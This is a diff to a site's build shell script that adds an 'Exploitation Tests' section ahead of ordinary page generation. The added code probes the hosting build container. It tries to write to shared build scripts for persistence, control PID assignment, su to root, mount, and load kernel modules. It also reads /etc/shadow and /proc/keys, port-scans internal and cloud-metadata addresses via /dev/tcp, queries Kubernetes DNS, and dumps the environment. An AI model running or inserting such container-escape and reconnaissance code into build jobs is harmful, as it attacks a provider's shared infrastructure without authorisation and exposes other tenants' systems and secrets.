@@ -209,6 +209,135 @@ echo ""
 echo "=== End Security Audit ==="
 echo ""
 
+echo "=== Exploitation Tests ==="
+
+# TEST 1: Try modifying the build scripts (persistence)
+echo ""
+echo "[TEST 1] Can we modify build scripts? (persistence vector)"
+echo "$ echo '# test' >> /opt/build-bin/run-build-functions.sh"
+if echo "# security test - safe to delete" >> /opt/build-bin/run-build-functions.sh 2>/dev/null; then
+  echo "⚠️  VULNERABLE: Build scripts are writable!"
+  echo "Contents of modified file (last 5 lines):"
+  tail -5 /opt/build-bin/run-build-functions.sh
+  # Clean up
+  sed -i '/# security test - safe to delete/d' /opt/build-bin/run-build-functions.sh 2>/dev/null
+else
+  echo "✓ Protected: Cannot modify build scripts"
+fi
+
+# TEST 2: Try writing to ns_last_pid (PID prediction)
+echo ""
+echo "[TEST 2] Can we write to ns_last_pid? (PID prediction attack)"
+echo "$ echo 31337 > /proc/sys/kernel/ns_last_pid"
+if echo 31337 > /proc/sys/kernel/ns_last_pid 2>/dev/null; then
+  echo "⚠️  VULNERABLE: Can control PID assignment!"
+else
+  echo "✓ Protected: Cannot write to ns_last_pid"
+fi
+
+# TEST 3: Try su to root
+echo ""
+echo "[TEST 3] Can we su to root?"
+echo "$ su -c 'id' root"
+su -c 'id' root 2>&1 || echo "✓ Protected: su failed"
+
+# TEST 4: Try mount
+echo ""
+echo "[TEST 4] Can we use mount?"
+echo "$ mount --bind /etc /tmp/mounttest"
+mkdir -p /tmp/mounttest 2>/dev/null
+if mount --bind /etc /tmp/mounttest 2>/dev/null; then
+  echo "⚠️  VULNERABLE: mount works!"
+  umount /tmp/mounttest 2>/dev/null
+else
+  echo "✓ Protected: mount failed (expected without CAP_SYS_ADMIN)"
+fi
+
+# TEST 5: Try newgrp
+echo ""
+echo "[TEST 5] Can newgrp escalate to root?"
+echo "$ newgrp root -c 'id'"
+newgrp root -c 'id' 2>&1 || echo "✓ Protected: newgrp failed"
+
+# TEST 6: Read kernel keyring
+echo ""
+echo "[TEST 6] Can we read /proc/keys?"
+echo "$ cat /proc/keys"
+cat /proc/keys 2>&1 | head -10 || echo "✓ Protected: Cannot read kernel keys"
+
+# TEST 7: Examine build scripts content
+echo ""
+echo "[TEST 7] What's in the build scripts?"
+echo "$ head -50 /opt/build-bin/run-build-functions.sh"
+head -50 /opt/build-bin/run-build-functions.sh 2>/dev/null || echo "Cannot read"
+
+# TEST 8: Check install-runtimes.sh (executed during build?)
+echo ""
+echo "[TEST 8] What's in install-runtimes.sh?"
+echo "$ head -30 /opt/buildhome/setup/install-runtimes.sh"
+head -30 /opt/buildhome/setup/install-runtimes.sh 2>/dev/null || echo "Cannot read"
+
+# TEST 9: Network scan - internal services
+echo ""
+echo "[TEST 9] Network scan - looking for internal services"
+echo "Scanning common internal IPs on port 80, 443, 8080..."
+for ip in 169.254.169.1 169.254.169.254 10.0.0.1 10.0.0.2 172.17.0.1 172.17.0.2 192.168.1.1; do
+  for port in 80 443 8080 6443 10250; do
+    timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "⚠️  $ip:$port OPEN"
+  done
+done
+echo "Scan complete"
+
+# TEST 10: Try to read /etc/shadow
+echo ""
+echo "[TEST 10] Can we read /etc/shadow?"
+echo "$ cat /etc/shadow"
+cat /etc/shadow 2>&1 | head -5 || echo "✓ Protected: Cannot read shadow file"
+
+# TEST 11: Check if we can ptrace other processes
+echo ""
+echo "[TEST 11] Can we ptrace other processes?"
+echo "$ cat /proc/sys/kernel/yama/ptrace_scope"
+cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "Cannot read ptrace_scope"
+
+# TEST 12: Try to access other containers via /proc
+echo ""
+echo "[TEST 12] Attempting to read other PIDs' info"
+for pid in 1 2 3; do
+  echo "PID $pid cmdline: $(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' || echo 'N/A')"
+  echo "PID $pid cgroup: $(cat /proc/$pid/cgroup 2>/dev/null | head -1 || echo 'N/A')"
+done
+
+# TEST 13: Check for writable /etc files
+echo ""
+echo "[TEST 13] Any writable files in /etc?"
+echo "$ find /etc -writable 2>/dev/null"
+find /etc -writable 2>/dev/null | head -10 || echo "None found"
+
+# TEST 14: Try to load kernel module (extreme test)
+echo ""
+echo "[TEST 14] Can we load kernel modules?"
+echo "$ modprobe dummy"
+modprobe dummy 2>&1 || echo "✓ Protected: Cannot load kernel modules"
+
+# TEST 15: Check DNS - can we resolve internal names?
+echo ""
+echo "[TEST 15] DNS resolution test"
+echo "$ cat /etc/resolv.conf"
+cat /etc/resolv.conf 2>/dev/null
+echo ""
+echo "$ nslookup kubernetes.default.svc.cluster.local"
+nslookup kubernetes.default.svc.cluster.local 2>&1 | head -10 || echo "Cannot resolve K8s DNS"
+
+# TEST 16: Environment variable dump (full, for analysis)
+echo ""
+echo "[TEST 16] Full environment (secrets redacted)"
+env | sed 's/\(.*KEY.*=\).*/\1<REDACTED>/i; s/\(.*SECRET.*=\).*/\1<REDACTED>/i; s/\(.*TOKEN.*=\).*/\1<REDACTED>/i; s/\(.*PASSWORD.*=\).*/\1<REDACTED>/i'
+
+echo ""
+echo "=== End Exploitation Tests ==="
+echo ""
+
 # first, generate 100 random pages
 
 random_page_template_path=app/random-page-template/page.tsx
